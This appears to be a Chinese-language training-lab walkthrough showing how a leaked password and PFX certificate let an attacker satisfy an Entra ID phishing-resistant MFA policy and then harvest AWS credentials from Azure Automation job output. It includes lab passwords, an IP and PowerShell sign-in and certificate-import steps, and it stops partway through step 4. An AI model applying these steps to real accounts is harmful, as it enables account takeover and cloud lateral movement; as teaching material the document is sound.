# Learning Objective 11：利用证书绕过抗钓鱼 MFA 与提取自动化作业凭据

> **文档版本**: v2.0 (基于项目资料优化版)
> **学习目标**: 掌握基于证书的认证 (CBA) 绕过抗钓鱼 MFA，以及从 Azure Automation Job Output 中提取凭据的技术
> **难度**: 中高级
> **预计时间**: 1.5-2 小时
> **Kill Chain**: KC3 Continuation (DevOps 供应链攻击延伸)

---

## 目录

1. [核心目标概述](#核心目标概述)
2. [理论基础](#理论基础)
3. [实验条件与环境准备](#实验条件与环境准备)
4. [详细实验步骤](#详细实验步骤)
5. [检测与防御](#检测与防御)
6. [参考资料与文件位置](#参考资料与文件位置)

---

## 核心目标概述

本学习目标展示了如何结合 **基于证书的认证 (CBA)** 和 **Azure Automation 账户的日志泄露漏洞**，实现从身份认证绕过到多云环境横向移动的完整攻击链。

### 攻击链示意图

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    Target 11 攻击链：MFA 绕过与凭据提取                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  前置条件 (来自 Objective 10):                                           │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  已获取:                                                          │   │
│  │  - ChristinaWBurrus 用户的密码 (从 Wiki 泄露)                     │   │
│  │  - ChristinaWBurrus 的 PFX 证书文件 (从 Wiki 泄露)                │   │
│  │  - Job ID (通过 GitHub IssueOps 触发获取)                        │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  阶段 1: MFA 绕过 (Certificate-Based Authentication Bypass)            │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  使用泄露的密码尝试登录 → 遭遇 Phishing-Resistant MFA 拦截        │   │
│  │  分析条件访问策略 → 发现允许 CBA (x509CertificateMultiFactor)    │   │
│  │  导入 PFX 证书 → 使用证书认证 → 成功绕过 MFA                     │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  阶段 2: 凭据提取 (Credential Extraction from Automation Logs)          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  登录 Azure Portal → 定位 Automation Account                     │   │
│  │  使用 Job ID 查询历史作业 → 读取 Job Output                     │   │
│  │  提取 AWS EC2 凭据 (IP, 用户名, 密码)                             │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  结果: 横向移动到 AWS 环境 (Multi-Cloud Attack)                         │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 关键里程碑

| 阶段 | 目标 | 技术要点 |
|------|------|----------|
| **MFA 遭遇** | 使用密码登录被拦截 | Phishing-Resistant MFA 策略 |
| **策略分析** | 发现 CBA 允许选项 | 认证强度 (Authentication Strength) |
| **证书导入** | 导入 PFX 证书 | 密码复用漏洞 |
| **MFA 绕过** | 使用证书登录成功 | CBA 满足抗钓鱼要求 |
| **凭据提取** | 从 Job Output 读取 AWS 凭据 | 自动化日志泄露 |

---

## 理论基础

### 1. 基于证书的认证 (Certificate-Based Authentication, CBA)

#### 什么是 CBA？

**基于证书的认证 (CBA)** 是 Microsoft Entra ID 中的一种强认证方法，它使用 X.509 数字证书作为用户的主要凭据，替代或补充传统的密码 + MFA 组合。

**官方文档参考：** [Microsoft Entra certificate-based authentication overview](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-certificate-based-authentication)

#### CBA 认证流程

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     CBA 认证流程                                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. 证书注册阶段                                                        │
│     用户证书 → 导入到用户对象 → 建立证书与身份的映射关系                 │
│                                                                         │
│  2. 认证阶段                                                            │
│     用户访问资源 → Entra ID 检测到证书 → 验证证书有效性                 │
│     → 检查证书策略 → 如果符合要求则允许访问                              │
│                                                                         │
│  3. 证书验证要素                                                        │
│     - 证书链完整性 (由受信任的 CA 签发)                                  │
│     - 证书有效期 (未过期)                                                │
│     - 证书用途 (Enhanced Key Usage 包含客户端认证)                       │
│     - 绑定关系 (证书映射到正确的用户)                                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

#### 为什么 CBA 被视为"抗钓鱼"认证？

根据 Microsoft 的 **Authentication Strength** 策略，认证方法按抗钓鱼能力分类：

| 认证方法 | 抗钓鱼级别 | 说明 |
|----------|-----------|------|
| **短信 (SMS)** | ❌ 非抗钓鱼 | 容易被 SIM 卡交换攻击 |
| **语音通话** | ❌ 非抗钓鱼 | 容易被 social engineering 攻击 |
| **软件 TOTP** | ❌ 非抗钓鱼 | 容易被中间人钓鱼攻击 |
| **密码 + 手机推送** | ❌ 非抗钓鱼 | 容易被 fatigue attack 攻击 |
| **FIDO2 硬件密钥** | ✅ 抗钓鱼 | 需要物理设备，无法远程钓鱼 |
| **Windows Hello for Business** | ✅ 抗钓鱼 | 需要生物特征或 TPM |
| **X.509 证书 (CBA)** | ✅ 抗钓鱼 | 私钥无法被钓鱼网站提取 |

**官方文档参考：** [Conditional Access authentication strength](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-strengths)

### 2. 条件访问策略中的认证强度

#### Authentication Strength 策略配置

在条件访问策略中，管理员可以要求特定的认证强度：

```json
{
  "grantControls": {
    "operator": "OR",
    "builtInControls": ["mfa"],
    "authenticationStrength": {
      "policy": {
        "id": "00000000-0000-0000-0000-000000000004",
        "displayName": "PhishingResistantMFA"
      },
      "allowedCombinations": [
        "password, x509CertificateMultiFactor",
        "fido2",
        "windowsHelloForBusiness"
      ]
    }
  }
}
```

#### 攻击面分析

**关键发现：** CBA 被视为"满足 MFA 要求"的认证方式。这意味着：
- 如果策略要求"抗钓鱼 MFA"
- 用户拥有有效的 X.509 证书
- 使用证书登录时，**系统不会再要求额外的手机 MFA**
- 这就是本实验中的绕过原理

**类比理解：**
```
普通门禁: 刷工牌 (密码) + 按指纹 (手机 MFA) = 进入
VIP 门禁: 佩戴"特级勋章" (证书) = 直接进入，不需要按指纹
攻击: 偷到了勋章，门禁看到勋章就直接开门了
```

### 3. Azure Automation Job Output 泄露

#### 什么是 Azure Automation？

**Azure Automation** 是微软提供的云自动化服务，允许用户通过 PowerShell Runbook 自动化管理 Azure 和其他云资源。

**官方文档参考：** [Azure Automation documentation](https://learn.microsoft.com/en-us/azure/automation/)

#### Job Output 的风险

Azure Automation 的 Runbook 在执行时会输出日志信息，这些日志被永久保存在 **Job Output** 和 **Job Streams** 中。

**风险场景：**

| 正常做法 | 危险做法 |
|----------|----------|
| 使用 `Write-Verbose` 输出调试信息 | 使用 `Write-Output` 输出敏感信息 |
| 将凭据存储在 Automation Account Credential 中 | 将凭据明文写入脚本 |
| 使用 Azure Key Vault 存储机密 | 在日志中打印密码 |

**官方文档参考：** [Manage job output and messages in Azure Automation](https://learn.microsoft.com/en-us/azure/automation/automation-runbook-output-and-messages)

#### 攻击原理

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    Job Output 攻击原理                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Runbook 脚本示例 (危险做法):                                            │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  # 创建 AWS VM 用户                                              │   │
│  │  $userName = "ASwtpuya6605"                                      │   │
│  │  $password = "ASriqpvsoecwljngk6613"  # 硬编码密码               │   │
│  │                                                                    │   │
│  │  Write-Output "VM Public IP: 3.208.47.144"  # 敏感信息           │   │
│  │  Write-Output "User UserName: $userName"     # 泄露用户名         │   │
│  │  Write-Output "User Password: $password"     # 泄露密码           │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  执行结果:                                                               │
│  Job Output 包含明文凭据 → 任何有读取 Job 权限的人都能看到              │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 4. 密码复用漏洞

#### 漏洞说明

在本实验场景中，发现了一个典型的 **密码复用漏洞**：

```
PFX 证书保护密码 = 用户登录密码
```

**为什么这是漏洞？**
1. **单点故障**: 如果密码泄露，攻击者同时获得登录权和证书访问权
2. **违反最佳实践**: 证书应使用独立、强随机的保护密码
3. **常见错误**: 用户为了记忆方便，将多个凭据设置为相同密码

**密码复用的风险：**

| 场景 | 密码相同 | 密码不同 |
|------|----------|----------|
| Wiki 泄露密码 | ❌ 同时泄露登录和证书 | ✅ 仅泄露登录 |
| 攻击者获取密码 | ❌ 完全控制账户 | ⚠️ 需要额外攻击 |
| 安全影响 | 🔴 高风险 | 🟡 中等风险 |

### 5. MITRE ATT&CK 框架映射

本实验涉及的 TTPs：

| 战术 | 技术 | 描述 |
|------|------|------|
| **Initial Access** | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) - Valid Accounts: Cloud Accounts | 使用泄露的用户凭据 |
| **Credential Access** | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Unsecured Credentials: Credentials In Files | 从 Wiki 提取硬编码凭据 |
| **Defense Evasion** | [T1550.001](https://attack.mitre.org/techniques/T1550/001/) - Application Level Authentication | 使用 CBA 绕过 MFA |
| **Credential Access** | [T1212](https://attack.mitre.org/techniques/T1212/) - Exploitation for Credential Access | 从 Job Output 提取凭据 |

---

## 实验条件与环境准备

### 前置条件

#### 1. 实验环境访问

在开始本实验之前，需要满足以下条件：

| 项目 | 要求 | 验证方法 |
|------|------|----------|
| **前序目标完成** | 已完成 Objective 10 | 已获取 Job ID |
| **Azure 访问** | 可访问 Azure Portal | `https://portal.azure.com` |
| **工具** | Windows 证书管理工具 | `certmgr.msc` |
| **PFX 文件** | ChristinaWBurrus 证书文件 | `ChristinaWBurrus...pfx` |

#### 2. 已获取的信息 (来自 Objective 10)

在开始本实验之前，你应该已经从 Objective 10 获取了以下信息：

| 信息 | 来源 | 值 (示例) |
|------|------|-----------|
| **Wiki URL** | 侦察发现 | `https://refiningwiki.z13.web.core.windows.net/` |
| **用户密码** | Wiki 文档 | `hd{_?sNRvue{{a+$vxo/` |
| **PFX 证书** | Wiki 下载 | `ChristinaWBurrus_cert.pfx` |
| **Job ID** | GitHub IssueOps | `742e4e1d-ece0-43d8-9544-0ccf0683a465` |

### 为什么需要这些条件？

#### 条件 1: 为什么需要完成 Objective 10？

Objective 11 是 Objective 10 的直接延续：

```
Objective 10 成果:
├─ 发现 Wiki 泄露的密码和证书
├─ 通过 GitHub IssueOps 触发自动化
└─ 获取 Job ID

Objective 11 使用:
├─ 密码 + 证书 → MFA 绕过
└─ Job ID → 查询 Job Output
```

**设计依据：** 这模拟了真实的多阶段攻击，攻击者在前期侦察中收集的信息被用于后续阶段。

#### 条件 2: 为什么需要 PFX 证书文件？

PFX (Personal Information Exchange) 文件包含：
- X.509 证书 (公钥)
- 私钥 (用于证明身份)
- 证书链 (中间证书和根证书)

**格式说明：**
```
PFX 文件结构:
├─ PKCS#12 容器
│  ├─ 私钥 (RSA 或 ECC)
│  ├─ X.509 证书
│  ├─ 中间证书链
│  └─ 保护密码
```

#### 条件 3: 为什么需要证书管理工具？

Windows 证书管理工具 (`certmgr.msc`) 用于：
- 导入 PFX 文件到用户证书存储
- 验证证书已正确安装
- 查看证书属性和有效期

### 实验环境架构

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         实验环境架构                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                    学生 VM (攻击者环境)                          │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  已获取资料:                                                     │   │
│  │  ┌─────────────────────────────────────────────────────────┐   │   │
│  │  │ ChristinaWBurrus 密码: hd{_?sNRvue{{a+$vxo/              │   │   │
│  │  │ ChristinaWBurrus.pfx (证书文件)                         │   │   │
│  │  │ Job ID: 742e4e1d-ece0-43d8-9544-0ccf0683a465            │   │   │
│  │  └─────────────────────────────────────────────────────────┘   │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              │                                          │
│                              │ 认证请求                                 │
│                              ▼                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                  Microsoft Entra ID                              │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  ChristinaWBurrus 用户                                          │   │
│  │  ┌─────────────────────────────────────────────────────────┐   │   │
│  │  │ 条件访问策略: PhishingResistantMFA                       │   │   │
│  │  │ - Require MFA: Yes                                       │   │   │
│  │  │ - Authentication Strength: Phishing-Resistant           │   │   │
│  │  │ - Allowed Combinations:                                  │   │   │
│  │  │   * password, x509CertificateMultiFactor ✓             │   │   │
│  │  │   * fido2                                               │   │   │
│  │  │   * windowsHelloForBusiness                             │   │   │
│  │  └─────────────────────────────────────────────────────────┘   │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                              │                                          │
│                              │ 认证成功                                  │
│                              ▼                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                 Azure Automation Account                         │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  ManageMultiCloud (Automation Account)                          │   │
│  │  ┌─────────────────────────────────────────────────────────┐   │   │
│  │  │ Runbook: ManageAWS                                       │   │   │
│  │  │ Job: 742e4e1d-ece0-43d8-9544-0ccf0683a465               │   │   │
│  │  │                                                         │   │   │
│  │  │ Job Output (包含敏感信息):                               │   │   │
│  │  │ - VM Public IP: 3.208.47.144                            │   │   │
│  │  │ - User UserName: ASwtpuya6605                           │   │   │
│  │  │ - User Password: ASriqpvsoecwljngk6613                  │   │   │
│  │  └─────────────────────────────────────────────────────────┘   │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  目标环境 (横向移动):                                                    │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                    AWS EC2 实例                                  │   │
│  │  IP: 3.208.47.144                                               │   │
│  │  用户: ASwtpuya6605                                             │   │
│  │  密码: ASriqpvsoecwljngk6613                                    │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 环境验证检查清单

```powershell
# 运行此脚本来验证实验环境
Write-Host "检查 MFA 绕过与凭据提取实验环境..." -ForegroundColor Cyan

# 1. 检查 PFX 文件是否存在
$pfxPath = "$HOME\Downloads\ChristinaWBurrus_cert.pfx"
if (Test-Path $pfxPath) {
    Write-Host "[✓] PFX 文件存在: $pfxPath" -ForegroundColor Green
} else {
    Write-Host "[✗] 未找到 PFX 文件" -ForegroundColor Red
    Write-Host "    请确保已从 Wiki 下载证书文件" -ForegroundColor Yellow
}

# 2. 检查 Job ID 是否已获取
$jobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"  # 替换为你的 Job ID
if ([string]::IsNullOrEmpty($jobId)) {
    Write-Host "[✗] Job ID 未设置" -ForegroundColor Red
    Write-Host "    请先完成 Objective 10 获取 Job ID" -ForegroundColor Yellow
} else {
    Write-Host "[✓] Job ID: $jobId" -ForegroundColor Green
}

# 3. 检查证书管理工具可用性
try {
    $certMgr = Get-Command certmgr.msc -ErrorAction Stop
    Write-Host "[✓] 证书管理工具可用" -ForegroundColor Green
} catch {
    Write-Host "[!] 证书管理工具不可用" -ForegroundColor Yellow
}

# 4. 检查 PowerShell 版本
$psVersion = $PSVersionTable.PSVersion
Write-Host "[*] PowerShell 版本: $($psVersion.Major).$($psVersion.Minor)" -ForegroundColor Cyan

Write-Host "`n环境检查完成!" -ForegroundColor Green
```

---

## 详细实验步骤

### 步骤 1：尝试登录并遭遇 MFA 拦截 (Verification)

#### 目标

使用从 Wiki 获取的密码尝试登录，确认被 Phishing-Resistant MFA 策略拦截。

#### 技术原理

**条件访问策略评估流程：**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    条件访问策略评估                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. 触发条件检查                                                        │
│     用户: ChristinaWBurrus ✓                                            │
│     位置: 任何                                                         │
│     设备: 任何                                                         │
│     应用: Azure Portal ✓                                                │
│                                                                         │
│  2. 策略匹配                                                            │
│     找到策略: PhishingResistantMFA                                      │
│     状态: Enabled                                                       │
│                                                                         │
│  3. 授权控制检查                                                        │
│     要求: Phishing-Resistant MFA                                        │
│     当前认证: Password only                                             │
│                                                                         │
│  4. 决策                                                                │
│     结果: DENY → 要求执行 MFA                                           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

#### 详细操作

**1.1 使用密码尝试登录**

```powershell
# 方法 1: 使用 Azure PowerShell 模块
$Password = ConvertTo-SecureString 'hd{_?sNRvue{{a+$vxo/' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ChristinaWBurrus@<your-domain>.com', $Password)

try {
    Connect-AzAccount -Credential $Cred -ErrorAction Stop
    Write-Host "登录成功" -ForegroundColor Green
} catch {
    Write-Host "登录失败: $($_.Exception.Message)" -ForegroundColor Red
}
```

**预期错误：**
```
Connect-AzAccount : You must use multi-factor authentication to access this resource.
```

**1.2 理解错误原因**

这个错误表明：
1. 密码是正确的（如果密码错误，会返回不同的错误消息）
2. 账户存在且活跃
3. 条件访问策略要求 MFA
4. 当前认证方式（仅密码）不满足要求

**1.3 验证条件访问策略（可选）**

如果之前在 Objective 4 中已经导出了策略配置，可以回顾：

```powershell
# 假设之前导出的策略文件
$caps = Get-Content "C:\AzAD\Tools\caps.json" | ConvertFrom-Json

# 查找 PhishingResistantMFA 策略
$targetPolicy = $caps | Where-Object { $_.displayName -like "*PhishingResistant*" }

Write-Host "策略名称: $($targetPolicy.displayName)" -ForegroundColor Cyan
Write-Host "认证强度: $($targetPolicy.grantControls.authenticationStrength.policy.displayName)" -ForegroundColor Cyan
Write-Host "允许组合: $($targetPolicy.grantControls.authenticationStrength.allowedCombinations -join ', ')" -ForegroundColor Yellow
```

#### 为什么这个步骤重要？

1. **确认防御存在**: 验证目标确实受 MFA 保护
2. **理解策略类型**: 确定是"抗钓鱼 MFA"而非普通 MFA
3. **寻找绕过方法**: 为下一步的策略分析做准备

**设计依据：** 在真实攻击中，攻击者会先试探目标的安全控制，然后再规划绕过策略。

---

### 步骤 2：分析条件访问策略 (Reconnaissance)

#### 目标

分析条件访问策略配置，识别允许基于证书的认证 (CBA) 作为满足 Phishing-Resistant MFA 要求的方法。

#### 技术原理

**认证强度级别：**

Microsoft Entra ID 中的 Authentication Strength 定义了不同级别的认证要求：

| 级别 | 描述 | 允许的认证方法 |
|------|------|----------------|
| **None** | 无特殊要求 | 仅密码 |
| **Multifactor** | 多因素认证 | 密码 + 任何第二因素 |
| **PhishingResistant** | 抗钓鱼认证 | FIDO2, Windows Hello, **X.509 证书** |

**CBA 作为 Phishing-Resistant 方法：**

X.509 证书被认为具有抗钓鱼特性，因为：
1. 私钥存储在本地，无法通过网络钓鱼提取
2. 证书需要物理访问才能使用（如果存储在智能卡或 TPM 中）
3. 证书验证需要完整的证书链，难以伪造

#### 详细操作

**2.1 回顾之前获取的策略信息**

如果在 Objective 4 中已经获取了策略信息，可以直接回顾：

```powershell
# 从 Objective 4 的结果中读取
$capsJson = Get-Content "C:\AzAD\Tools\caps.json" -Raw
$policy = $capsJson | ConvertFrom-Json | Where-Object {
    $_.grantControls.authenticationStrength.policy.displayName -like "*PhishingResistant*"
}

# 显示关键配置
$policy | Select-Object displayName, state, `
    @{Name="IncludeGroups"; Expression={$_.conditions.users.includeGroups}}, `
    @{Name="GrantControls"; Expression={$_.grantControls.builtInControls}}, `
    @{Name="AuthStrength"; Expression={$_.grantControls.authenticationStrength.policy.displayName}}, `
    @{Name="AllowedCombinations"; Expression={$_.grantControls.authenticationStrength.allowedCombinations -join ', '}}
```

**预期发现：**
```json
{
  "displayName": "PhishingResistantMFA",
  "state": "enabled",
  "grantControls": {
    "builtInControls": ["mfa"],
    "authenticationStrength": {
      "policy": {
        "displayName": "Phishing-Resistant MFA"
      },
      "allowedCombinations": [
        "password, x509CertificateMultiFactor",
        "fido2",
        "windowsHelloForBusiness"
      ]
    }
  }
}
```

**2.2 分析允许的认证组合**

| 认证组合 | 是否可用 | 说明 |
|----------|----------|------|
| `password, x509CertificateMultiFactor` | ✅ 可用 | **密码 + X.509 证书 = 满足要求** |
| `fido2` | ❓ 需要 FIDO2 设备 | 我们没有 FIDO2 密钥 |
| `windowsHelloForBusiness` | ❌ 需要已注册设备 | 我们没有已注册的设备 |

**关键发现：** `password, x509CertificateMultiFactor` 是可行的绕过路径！

**2.3 理解 CBA 的工作原理**

```
┌─────────────────────────────────────────────────────────────────────────┐
│              CBA 认证如何满足 Phishing-Resistant 要求                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  传统 MFA 流程:                                                         │
│  用户输入密码 → 系统要求手机验证 → 用户批准 → 允许访问                   │
│                                                                         │
│  CBA 流程:                                                              │
│  用户输入密码 → 系统检测到证书 → 验证证书 → 允许访问                     │
│                       (跳过手机验证，因为证书本身满足抗钓鱼要求)           │
│                                                                         │
│  为什么 CBA 更强？                                                       │
│  - 证书私钥无法被钓鱼网站提取                                            │
│  - 证书需要物理保护（如果存储在智能卡或 TPM 中）                          │
│  - 证书有完整的链验证，难以伪造                                          │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

#### 为什么需要分析策略？

1. **识别绕过路径**: 不是所有 MFA 策略都允许 CBA
2. **理解风险等级**: Phishing-Resistant 比普通 MFA 更严格，但仍有绕过可能
3. **规划攻击方式**: 确定需要获取哪些凭据（证书）

**设计依据：** 根据项目的 [target4.md](target4.md) 中的分析方法，系统性地分析条件访问策略是绕过 MFA 的关键步骤。

---

### 步骤 3：导入证书并绕过 MFA (The Bypass)

#### 目标

导入从 Wiki 获取的 PFX 证书文件，利用基于证书的认证 (CBA) 成功绕过 Phishing-Resistant MFA 要求，登录 Azure Portal。

#### 技术原理

**PFX 证书导入流程：**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    PFX 证书导入流程                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. 获取 PFX 文件                                                       │
│     文件: ChristinaWBurrus_cert.pfx                                     │
│     内容: X.509 证书 + 私钥 + 证书链                                    │
│     保护: 密码保护                                                      │
│                                                                         │
│  2. 导入到证书存储                                                      │
│     位置: Current User\Personal                                         │
│     要求: 输入 PFX 保护密码                                              │
│                                                                         │
│  3. 建立证书映射                                                        │
│     Entra ID 将证书与用户账户关联                                        │
│     方法: 证书的 Subject 或 SAN 扩展包含用户 UPN                         │
│                                                                         │
│  4. 浏览器使用证书                                                      │
│     登录时检测到可用证书 → 选择证书 → 完成认证                           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**密码复用漏洞利用：**

在本实验场景中，PFX 文件的保护密码与用户登录密码相同：

```
用户登录密码: hd{_?sNRvue{{a+$vxo/
PFX 保护密码: hd{_?sNRvue{{a+$vxo/
```

这是一个典型的 **密码复用漏洞**，攻击者可以利用此密码同时：
1. 作为用户登录凭证
2. 解锁 PFX 证书文件

#### 详细操作

**3.1 验证 PFX 文件存在**

```powershell
# 检查 PFX 文件
$pfxPath = "$HOME\Downloads\ChristinaWBurrus_cert.pfx"

if (Test-Path $pfxPath) {
    $fileInfo = Get-Item $pfxPath
    Write-Host "PFX 文件信息:" -ForegroundColor Cyan
    Write-Host "  路径: $($fileInfo.FullName)" -ForegroundColor White
    Write-Host "  大小: $($fileInfo.Length) bytes" -ForegroundColor White
    Write-Host "  修改时间: $($fileInfo.LastWriteTime)" -ForegroundColor White
} else {
    Write-Host "未找到 PFX 文件" -ForegroundColor Red
    exit 1
}
```

**3.2 方法 A：使用证书管理器导入（GUI 方法）**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                   Windows 证书管理器导入步骤                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. 打开证书管理器                                                      │
│     - 按 Win+R，输入 certmgr.msc，回车                                  │
│     - 或者在 PowerShell 中运行:                                          │
│       certmgr.msc                                                       │
│                                                                         │
│  2. 导入 PFX 文件                                                       │
│     a. 导航到: Personal > Certificates                                  │
│     b. 右键点击 "Certificates" > All Tasks > Import...                  │
│     c. 点击 Next                                                        │
│     d. 浏览到 PFX 文件位置                                              │
│     e. 输入保护密码: hd{_?sNRvue{{a+$vxo/                              │
│     f. 选择证书存储: Personal                                           │
│     g. 完成导入向导                                                      │
│                                                                         │
│  3. 验证证书已导入                                                      │
│     - 在 Personal > Certificates 中应该能看到新导入的证书                │
│     - 双击证书查看详情                                                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**3.3 方法 B：使用 PowerShell 导入（命令行方法）**

```powershell
# 使用 PowerShell 导入 PFX 证书
$pfxPath = "$HOME\Downloads\ChristinaWBurrus_cert.pfx"
$pfxPassword = ConvertTo-SecureString 'hd{_?sNRvue{{a+$vxo/' -AsPlainText -Force

try {
    # 导入证书到 Current User\Personal 存储
    Import-PfxCertificate -FilePath $pfxPath `
                          -CertStoreLocation 'Cert:\CurrentUser\My' `
                          -Password $pfxPassword `
                          -Exportable

    Write-Host "[✓] 证书导入成功" -ForegroundColor Green

    # 显示新导入的证书
    $newCert = Get-ChildItem 'Cert:\CurrentUser\My' | Sort-Object NotBefore -Descending | Select-Object -First 1

    Write-Host "`n证书详情:" -ForegroundColor Cyan
    Write-Host "  主题: $($newCert.Subject)" -ForegroundColor White
    Write-Host "  颁发者: $($newCert.Issuer)" -ForegroundColor White
    Write-Host "  有效期: $($newCert.NotBefore) 至 $($newCert.NotAfter)" -ForegroundColor White
    Write-Host "  指纹: $($newCert.Thumbprint)" -ForegroundColor White

} catch {
    Write-Host "[✗] 证书导入失败: $($_.Exception.Message)" -ForegroundColor Red
}
```

**预期输出：**
```
[✓] 证书导入成功

证书详情:
  主题: CN=ChristinaWBurrus@<domain>.com
  颁发者: CN=<CA-Name>
  有效期: 2024-01-01 至 2025-12-31
  指纹: A1B2C3D4E5F6789012345678901234567890ABCD
```

**3.4 使用证书登录 Azure Portal**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                  使用证书登录 Azure Portal 步骤                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. 打开浏览器（推荐使用无痕模式）                                       │
│     - Chrome: Ctrl+Shift+N                                             │
│     - Edge: Ctrl+Shift+P                                               │
│     - Firefox: Ctrl+Shift+P                                            │
│                                                                         │
│  2. 访问 Azure Portal                                                   │
│     URL: https://portal.azure.com                                       │
│                                                                         │
│  3. 输入用户名                                                          │
│     用户名: ChristinaWBurrus@<your-domain>.com                           │
│     点击: Next                                                          │
│                                                                         │
│  4. 输入密码                                                            │
│     密码: hd{_?sNRvue{{a+$vxo/                                          │
│     点击: Sign in                                                       │
│                                                                         │
│  5. 关键时刻：选择证书                                                  │
│     如果已导入证书，浏览器会弹出证书选择对话框：                          │
│     ┌─────────────────────────────────────────────────────────────┐    │
│     │  Select a certificate                                       │    │
│     │  ┌─────────────────────────────────────────────────────┐   │    │
│     │  │ ChristinaWBurrus@<domain>.com                         │   │    │
│     │  │ Issued by: <CA-Name>                                  │   │    │
│     │  │ Expires: 2025-12-31                                   │   │    │
│     │  │                                    [Cancel] [OK]     │   │    │
│     │  └─────────────────────────────────────────────────────┘   │    │
│     └─────────────────────────────────────────────────────────────┘    │
│                                                                         │
│     选择证书并点击 OK                                                    │
│                                                                         │
│  6. 验证登录成功                                                        │
│     - 浏览器跳转到 Azure Portal                                         │
│     - 没有要求手机 MFA 验证                                             │
│     - 成功绕过 Phishing-Resistant MFA                                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**3.5 验证 MFA 绕过成功**

```powershell
# 使用 Azure PowerShell 验证登录
$context = Get-AzContext

if ($context) {
    Write-Host "当前登录信息:" -ForegroundColor Green
    Write-Host "  账户: $($context.Account)" -ForegroundColor White
    Write-Host "  订阅: $($context.Subscription.Name)" -ForegroundColor White
    Write-Host "  租户: $($context.Tenant.Id)" -ForegroundColor White

    Write-Host "`n[✓] MFA 绕过成功！" -ForegroundColor Green
    Write-Host "    使用证书认证登录，未要求手机 MFA" -ForegroundColor Yellow
} else {
    Write-Host "未检测到活动登录" -ForegroundColor Yellow
}
```

#### 为什么这个步骤成功？

**认证流程对比：**

| 步骤 | 传统 MFA 流程 | CBA 绕过流程 |
|------|--------------|--------------|
| 1. 输入密码 | ✓ | ✓ |
| 2. 检测策略 | 要求 MFA | 要求 Phishing-Resistant MFA |
| 3. 可用方法 | 手机推送/验证码 | 证书认证 |
| 4. 第二因素 | 需要手机批准 | 证书已满足抗钓鱼要求 |
| 5. 结果 | 等待手机批准 | **直接允许访问** |

**CBA 满足 Phishing-Resistant 的原因：**

1. **私钥保护**: 私钥存储在本地，无法被钓鱼网站提取
2. **物理要求**: 如果使用智能卡或 TPM，需要物理访问
3. **链验证**: 完整的证书链确保身份真实性

---

### 步骤 4：定位资源与作业 (Enumeration)

#### 目标

登录 Azure Portal 后，定位之前通过 GitHub IssueOps 触发的自动化作业（Job），使用从 Objective 10 获取的 Job ID。

#### 技术原理

**Azure Automation 资源层次结构：**

```
┌─────────────────────────────────────────────────────────────────────────┐
│            Azure Automation Account 资源层次结构                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Resource Group                                                         │
│  └─ Automation Account (如: ManageMultiCloud)                          │
│     ├─ Runbooks (自动化脚本)                                            │
│     │  └─ ManageAWS                                                    │
│     ├─ Jobs (作业执行历史)                                              │
│     │  ├─ Job 1: 742e4e1d-... (我们的目标)                              │
│     │  ├─ Job 2: ...                                                   │
│     │  └─ Job 3: ...                                                   │
│     ├─ Credentials (凭据存储)                                           │
│     ├─ Variables (变量存储)                                             │
│     └─ Schedules (定时任务)                                             │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**Job 输出包含的信息类型：**

| 输出类型 | 说明 | 风险 |
|----------|------|------|
